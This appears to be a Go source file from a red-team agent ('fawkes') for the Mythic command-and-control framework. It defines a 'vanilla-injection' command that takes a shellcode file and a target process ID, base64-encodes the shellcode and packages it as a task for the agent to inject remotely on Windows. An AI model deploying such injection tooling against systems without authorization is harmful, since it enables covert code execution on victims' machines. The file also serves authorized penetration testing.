package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "vanilla-injection",
		Description:         "Perform vanilla remote process injection using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread",
		HelpString:          "vanilla-injection",
		Version:             1,
		MitreAttackMappings: []string{"T1055.001", "T1055.002"}, // Process Injection: Dynamic-link Library Injection, Portable Executable Injection
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "The shellcode file to inject from files already registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file to inject",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "pid",
				ModalDisplayName: "Target PID",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "The process ID to inject shellcode into",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			// For command line usage, we'd need to parse differently
			// For now, require JSON format
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			var fileID string
			var filename string
			var fileContents []byte
			var err error

			// Determine which parameter group was used
			switch strings.ToLower(taskData.Task.ParameterGroupName) {
			case "default":
				// User selected an existing file from the dropdown by filename
				filename, err = taskData.Args.GetStringArg("filename")
				if err != nil {
					logging.LogError(err, "Failed to get filename")
					response.Success = false
					response.Error = "Failed to get shellcode file: " + err.Error()
					return response
				}

				// Search for the file by filename
				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					CallbackID:      taskData.Callback.ID,
					Filename:        filename,
					LimitByCallback: false,
					MaxResults:      -1,
				})
				if err != nil {
					logging.LogError(err, "Failed to search for file by name")
					response.Success = false
					response.Error = "Failed to search for file: " + err.Error()
					return response
				}
				if !search.Success {
					response.Success = false
					response.Error = search.Error
					return response
				}
				if len(search.Files) == 0 {
					response.Success = false
					response.Error = fmt.Sprintf("Failed to find file: %s", filename)
					return response
				}
				fileID = search.Files[0].AgentFileId

				// Get file contents directly (no file transfer to agent)
				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: fileID,
				})
				if err != nil {
					logging.LogError(err, "Failed to get file contents")
					response.Success = false
					response.Error = "Failed to get file contents: " + err.Error()
					return response
				}
				if !getResp.Success {
					response.Success = false
					response.Error = getResp.Error
					return response
				}
				fileContents = getResp.Content

			case "new file":
				// User uploaded a new file
				fileID, err = taskData.Args.GetStringArg("file")
				if err != nil {
					logging.LogError(err, "Failed to get file")
					response.Success = false
					response.Error = "Failed to get shellcode file: " + err.Error()
					return response
				}

				// Get file details
				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					AgentFileID: fileID,
				})
				if err != nil {
					logging.LogError(err, "Failed to search for file")
					response.Success = false
					response.Error = "Failed to search for file: " + err.Error()
					return response
				}
				if !search.Success {
					response.Success = false
					response.Error = search.Error
					return response
				}
				if len(search.Files) == 0 {
					response.Success = false
					response.Error = "Failed to find the specified file"
					return response
				}
				filename = search.Files[0].Filename

				// Get file contents directly (no file transfer to agent)
				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: fileID,
				})
				if err != nil {
					logging.LogError(err, "Failed to get file contents")
					response.Success = false
					response.Error = "Failed to get file contents: " + err.Error()
					return response
				}
				if !getResp.Success {
					response.Success = false
					response.Error = getResp.Error
					return response
				}
				fileContents = getResp.Content

			default:
				response.Success = false
				response.Error = fmt.Sprintf("Unknown parameter group: %s", taskData.Task.ParameterGroupName)
				return response
			}

			// Get the target PID
			pid, err := taskData.Args.GetNumberArg("pid")
			if err != nil {
				logging.LogError(err, "Failed to get PID")
				response.Success = false
				response.Error = "Failed to get target PID: " + err.Error()
				return response
			}

			if pid <= 0 {
				response.Success = false
				response.Error = "Invalid PID specified (must be greater than 0)"
				return response
			}

			// Build the display parameters
			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget PID: %d", filename, len(fileContents), int(pid))
			response.DisplayParams = &displayParams

			// Build the actual parameters JSON that will be sent to the agent
			// Encode shellcode contents as base64 to embed in JSON
			params := map[string]interface{}{
				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
				"pid":           int(pid),
			}

			paramsJSON, err := json.Marshal(params)
			if err != nil {
				logging.LogError(err, "Failed to marshal parameters")
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}

			// Set the parameters as a JSON string
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
	})
}
